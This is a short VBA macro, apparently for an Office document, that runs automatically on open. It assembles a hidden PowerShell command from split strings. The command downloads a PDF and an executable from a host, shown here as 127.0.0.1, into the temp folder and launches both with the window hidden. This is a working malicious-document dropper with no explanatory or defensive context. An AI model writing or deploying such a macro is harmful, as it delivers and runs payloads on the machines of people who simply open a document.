Sub AutoOpen()
  Dim cuthulhu As String
  cuthulhu = "pow"
  cuthulhu = cuthulhu + "ers"
  cuthulhu = cuthulhu + "hell "
  cuthulhu = cuthulhu + "-NoP -NonI -W Hidden """
  
  cuthulhu = cuthulhu + "('http://127.0.0.1/file.pdf','http://127.0.0.1/file.exe')"
  
  cuthulhu = cuthulhu + "|foreach{$fileName=$env:temp+'\'+(Split-Path -Path $_ -Leaf);"
  
  cuthulhu = cuthulhu + "(New-Object System.Net.WebClient).DownloadFile($_,$fileName);"
  
  cuthulhu = cuthulhu + "Invoke-Item $fileName;}"
  
  cuthulhu = cuthulhu + """"
  
  VBA.CreateObject("WScript.Shell").Run cuthulhu, 0
  
End Sub
